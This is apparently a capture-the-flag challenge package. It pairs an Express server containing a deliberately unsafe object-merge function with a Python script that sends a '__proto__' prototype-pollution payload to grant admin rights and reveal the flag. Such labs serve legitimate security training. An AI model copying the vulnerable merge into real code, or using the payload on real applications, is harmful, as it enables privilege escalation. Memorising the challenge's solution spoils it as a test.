{
  "server_code": "\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\n// Vulnerable merge function\nfunction merge(target, source) {\n    for (let key in source) {\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n\n// User object\nlet users = {};\n\napp.post('/register', (req, res) => {\n    const userData = req.body;\n    const newUser = {};\n    \n    // VULNERABLE: merge without sanitization\n    merge(newUser, userData);\n    \n    users[newUser.username] = newUser;\n    \n    // Check if admin (polluted prototype!)\n    if (newUser.isAdmin === true) {\n        res.json({ \n            message: 'Admin registered!', \n            flag: 'FLAG{pr0t0typ3_p011ut10n_rc3}' \n        });\n    } else {\n        res.json({ message: 'User registered' });\n    }\n});\n\napp.listen(5003, () => {\n    console.log('Server on port 5003');\n});\n\n// Exploit payload:\n// POST /register\n// {\n//   \"username\": \"attacker\",\n//   \"__proto__\": {\n//     \"isAdmin\": true\n//   }\n// }\n",
  "package_json": "\n{\n  \"name\": \"ctf-prototype-pollution\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",\n    \"body-parser\": \"^1.20.0\"\n  }\n}\n",
  "exploit_script": "\nimport requests\nimport json\n\n# Prototype pollution exploit\nurl = 'http://localhost:5003/register'\n\npayload = {\n    \"username\": \"attacker\",\n    \"__proto__\": {\n        \"isAdmin\": True\n    }\n}\n\nresponse = requests.post(url, json=payload)\nprint(response.json())\n",
  "url": "http://localhost:5003",
  "vulnerability": "Prototype pollution leading to privilege escalation",
  "flag": "FLAG{pr0t0typ3_p011ut10n_rc3}"
}